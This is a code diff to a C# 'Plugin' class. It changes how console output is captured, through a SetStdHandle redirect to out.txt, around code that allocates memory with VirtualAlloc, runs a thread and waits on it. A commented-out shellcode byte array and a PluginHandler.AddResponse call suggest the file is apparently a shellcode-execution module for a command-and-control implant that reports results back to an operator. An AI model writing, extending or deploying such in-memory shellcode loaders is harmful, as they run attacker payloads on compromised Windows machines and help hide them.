@@ -21,17 +21,23 @@ namespace Plugin
 
 
 
-                /*FileStream filestream = new FileStream("out.txt", FileMode.Create);
+                FileStream filestream = new FileStream("out.txt", FileMode.Create);
                 var streamwriter = new StreamWriter(filestream);
                 streamwriter.AutoFlush = true;
                 Console.SetOut(streamwriter);
                 Console.SetError(streamwriter);
-                */
-                StringBuilder builder = new StringBuilder();
+
+               IntPtr handle = filestream.SafeFileHandle.DangerousGetHandle();
+               int status = SetStdHandle(-11, handle); // set stdout
+                                                    // Check status as needed
+                status = SetStdHandle(-12, handle); // set stderr
+                                                    // Check status as needed
+
+                /*StringBuilder builder = new StringBuilder();
                 TextWriter writer = new StringWriter(builder);
                 Console.SetOut(writer);
                 Console.SetError(writer);
-
+                */
                 // byte[] x64shellcode = new byte[2] { 0xfc, 0x48 };
 
                 IntPtr funcAddr = VirtualAlloc(
@@ -50,12 +56,12 @@ namespace Plugin
                 Thread.Sleep(10000);
                 //WaitForSingleObject(hThread, 0xFFFFFFFF);
                 WaitForSingleObject(hThread, 0);
-                /*filestream.Close();
+                filestream.Close();
                 using (StreamReader sr = new StreamReader("out.txt"))
                 {
                     res = sr.ReadToEnd();
-                }*/
-                res= builder.ToString();
+                }
+                //res= builder.ToString();
             }
             PluginHandler.AddResponse(new ResponseResult
             {
@@ -86,6 +92,18 @@ namespace Plugin
         private static extern uint WaitForSingleObject(
             IntPtr hHandle,
             uint dwMilliseconds);
+
+        [DllImport("Kernel32.dll", SetLastError = true)]
+        public static extern int SetStdHandle(int device, IntPtr handle);
+
+        /*
+         * HANDLE new_stdout = CreateFileA("log.txt", ...);
+SetStdHandle(STD_OUTPUT_HANDLE, new_stdout);
+int fd = _open_osfhandle(new_stdout, O_WRONLY|O_TEXT);
+dup2(fd, STDOUT_FILENO);
+close(fd);
+        */
+
 
         public enum StateEnum
         {
